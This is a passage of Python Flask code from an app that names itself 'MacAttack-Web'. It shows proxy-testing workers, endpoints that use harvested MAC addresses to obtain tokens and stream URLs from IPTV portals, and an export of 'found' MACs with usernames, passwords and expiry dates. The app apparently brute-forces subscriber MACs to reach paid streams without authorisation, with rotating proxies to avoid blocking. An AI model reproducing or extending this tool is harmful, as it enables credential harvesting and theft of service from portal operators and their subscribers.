            return p, False
    
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for proxy, ok in ex.map(lambda p: test(p), proxies):
            if ok:
                working.append(proxy)
                add_log(proxy_state, f"✓ {proxy}", "success")
            else:
                failed.append(proxy)
                add_log(proxy_state, f"✗ {proxy}", "error")
    
    proxy_state["working_proxies"] = working
    proxy_state["failed_proxies"] = failed
    add_log(proxy_state, f"Done: {len(working)}/{len(proxies)} working", "success")
    proxy_state["testing"] = False


def test_proxies_autodetect_worker():
    proxies = config.get("proxies", []) or proxy_state.get("proxies", [])
    if not proxies:
        add_log(proxy_state, "No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
    result_proxies, failed = [], []
    threads = get_settings().get("proxy_test_threads", 50)
    add_log(proxy_state, f"Testing {len(proxies)} proxies (auto-detect type)...", "info")
    
    def test_autodetect(proxy):
        base = proxy
        for prefix in ["socks5://", "socks4://", "http://"]:
            if proxy.startswith(prefix):
                base = proxy[len(prefix):]
                break
        
        auth = ""
        if "@" in base:
            auth, base = base.rsplit("@", 1)
            auth += "@"
        
        for test_proxy, ptype in [(base, "HTTP"), (f"socks5://{auth}{base}", "SOCKS5"), (f"socks4://{base}", "SOCKS4")]:
            try:
                with no_proxy_environment():
                    resp = requests.get("http://httpbin.org/ip", proxies=stb.parse_proxy(test_proxy), timeout=10)
                    if resp.status_code == 200:
                        return proxy, test_proxy, ptype, True
            except:
                pass
        return proxy, proxy, "NONE", False
    
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for orig, detected, ptype, ok in ex.map(test_autodetect, proxies):
            if ok:
                result_proxies.append(detected)
                add_log(proxy_state, f"✓ {detected} ({ptype})", "success")
            else:
                failed.append(orig)
                add_log(proxy_state, f"✗ {orig}", "error")
    
    proxy_state["working_proxies"] = result_proxies
    proxy_state["failed_proxies"] = failed
    config["proxies"] = result_proxies + failed
    save_config()
    add_log(proxy_state, f"Done: {len(result_proxies)}/{len(proxies)} working", "success")
    proxy_state["testing"] = False



# ============== PLAYER ==============

@app.route("/api/player/connect", methods=["POST"])
@requires_auth
def api_player_connect():
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    proxy = data.get("proxy", "").strip() or None
    
    if not url or not mac:
        return jsonify({"success": False, "error": "URL and MAC required"})
    
    if not url.startswith("http"):
        url = f"http://{url}"
    
    try:
        token, token_random, portal_type, _ = stb.get_token(url, mac, proxy)
        if not token:
            return jsonify({"success": False, "error": "Failed to get token"})
        
        return jsonify({
            "success": True,
            "token": token,
            "token_random": token_random,
            "portal_type": portal_type,
            "live": [{"id": g["id"], "name": g["title"]} for g in stb.get_genres(url, mac, token, portal_type, token_random, proxy)],
            "vod": [{"id": c["id"], "name": c["title"]} for c in stb.get_vod_categories(url, mac, token, portal_type, token_random, proxy)],
            "series": [{"id": c["id"], "name": c["title"]} for c in stb.get_series_categories(url, mac, token, portal_type, token_random, proxy)]
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/player/channels", methods=["POST"])
@requires_auth
def api_player_channels():
    data = request.json
    try:
        channels, total = stb.get_channels(
            data.get("url"), data.get("mac", "").upper(), data.get("token"),
            data.get("portal_type", "portal.php"), data.get("category_type", "IPTV"),
            data.get("category_id", ""), data.get("token_random"),
            data.get("proxy") or None
        )
        return jsonify({"success": True, "channels": channels, "total": total})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/player/stream", methods=["POST"])
@requires_auth
def api_player_stream():
    data = request.json
    try:
        if data.get("content_type") == "vod":
            url = stb.get_vod_stream_url(
                data.get("url"), data.get("mac", "").upper(), data.get("token"),
                data.get("portal_type", "portal.php"), data.get("cmd"),
                data.get("token_random"), data.get("proxy") or None
            )
        else:
            url = stb.get_stream_url(
                data.get("url"), data.get("mac", "").upper(), data.get("token"),
                data.get("portal_type", "portal.php"), data.get("cmd"),
                data.get("token_random"), data.get("proxy") or None
            )
        
        if url:
            return jsonify({"success": True, "stream_url": url})
        return jsonify({"success": False, "error": "Failed to get stream"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


# ============== FOUND MACS ==============

@app.route("/api/found", methods=["GET", "DELETE"])
@requires_auth
def api_found():
    if request.method == "GET":
        return jsonify(config.get("found_macs", []))
    
    config["found_macs"] = []
    save_config()
    return jsonify({"success": True})

@app.route("/api/found/export")
@requires_auth
def api_found_export():
    fmt = request.args.get("format", "txt")
    found = config.get("found_macs", [])
    
    if fmt == "json":
        return Response(json.dumps(found, indent=2), mimetype="application/json",
                       headers={"Content-Disposition": "attachment;filename=found_macs.json"})
    
    lines = []
    for m in found:
        line = f"Portal: {m.get('portal', 'N/A')}\nMAC: {m['mac']}\n"
        if m.get('username') and m.get('password'):
            line += f"Username: {m['username']}\nPassword: {m['password']}\n"
        if m.get('max_connections'):
            line += f"Max Conn: {m['max_connections']}\n"
        line += f"Expiry: {m.get('expiry', 'N/A')}\nChannels: {m.get('channels', 0)}\n"
        if m.get('genres'):
            line += f"Genres: {', '.join(m['genres'])}\n"
        line += f"Found: {m.get('found_at', 'N/A')}\n{'='*50}\n"
        lines.append(line)
    
    return Response("\n".join(lines), mimetype="text/plain",
                   headers={"Content-Disposition": "attachment;filename=found_macs.txt"})


# ============== MAIN ==============

if __name__ == "__main__":
    load_config()
    logger.info(f"MacAttack-Web v{VERSION} starting on {host}")
    
    parts = host.split(":")
    bind_host = parts[0]
    bind_port = int(parts[1]) if len(parts) > 1 else 5003
    
    waitress.serve(app, host=bind_host, port=bind_port)
